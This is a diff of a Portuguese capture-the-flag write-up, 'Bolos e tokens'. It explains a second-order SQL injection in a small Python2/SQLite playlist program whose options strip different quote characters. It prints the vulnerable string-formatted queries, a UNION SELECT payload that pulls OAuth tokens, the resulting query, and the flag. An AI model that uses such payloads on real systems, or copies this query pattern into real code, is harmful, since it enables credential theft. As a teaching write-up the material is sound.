@@ -1,4 +1,4 @@
-## [NOT USED IN THE CTF] Chall 08 - Bolos e tokens (made by Guerra - PInG 2020)
+# Bolos e tokens
 
 **Flag:** `Ganesh{Th3_c@K3_i5_4_L!3}`
 
@@ -11,20 +11,20 @@ Neste chall somos presenteados com um mini programa feito em python2 e SQLite3 q
 
 A primeira coisa a se fazer em um cenário que já temos o script em mãos é analisar calmamente as possíveis vulnerabilidades em cada uma delas. Então por partes...
 
-```:::python
+```text
 if choice == '1':
     my_print("Enter the artist name:")
     artist = raw_input().replace('"', "")
-    
+
     my_print("Enter the song name:")
     song = raw_input().replace('"', "")
 
     c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
 ```
 
-A opção 1 permite que nós cadastremos uma nova linha da tabela de músicas. Vemos também que há um replace que impede a inserção de aspas duplas na query. Ela, portanto, não seria vulnerável à injeções do tipo `" OR 1=1 ... --`. 
+A opção 1 permite que nós cadastremos uma nova linha da tabela de músicas. Vemos também que há um replace que impede a inserção de aspas duplas na query. Ela, portanto, não seria vulnerável à injeções do tipo `" OR 1=1 ... --`.
 
-```:::python
+```text
 elif choice == '2':
     my_print("Enter the  artist name:")
     artist = raw_input().replace("'", "")
@@ -34,7 +34,7 @@ elif choice == '2':
 
 A opção 2, assim como a 1, apresenta uma Query de busca que possui um tratamento. Esse cenário no entanto faz o tratamento de aspas simples ao invés das duplas.
 
-```:::python
+```text
 elif choice == '3':
     my_print("Enter the song name:")
     song = raw_input().replace("'", "")
@@ -44,8 +44,7 @@ elif choice == '3':
 
 Similar à opção 2, novamente uma query de buscar porém tratando apenas as entradas com aspas simples.
 
-
-```:::python
+```text
 elif choice == '4':
     artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
     my_print("Choosing songs from '{}'".format(artist))
@@ -61,7 +60,7 @@ Uma das falhas dele, no entanto, foi não padronizar as aspas utilizadas nas dif
 
 Vamos então cadastrar um artista e uma música com o seguinte payload:
 
-```
+```text
 $ Enter the artist name:
 $ ' UNION SELECT oauth_token, 'abc' FROM $ oauth_tokens --
 $ Enter the song name:
@@ -78,14 +77,14 @@ Já a opção 4, como já foi citado, escolhe um artista no banco e o utiliza pa
 
 Caso não tenha ficado 100% claro, basta ver que a variável artistas será carregada com o único artista do banco
 
-```:::python
+```text
 artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
 artist = "' UNION SELECT oauth_token, 'abc' FROM oauth_tokens -- "
 ```
 
 e ao concatenar esse valor na query seguinte, teremos um select com um **Union Atack**
 
-```:::sql
+```text
 SELECT artist, song 
     FROM media 
     WHERE artist = '' 
@@ -95,7 +94,8 @@ SELECT artist, song
 
 Com isso somos então presentados com a nossa flag
 
-```
+```text
 == New Playlist ==
 1) Song: "abc" - Artist: "Ganesh{Th3_c@K3_i5_4_L!3}"
 ```
+
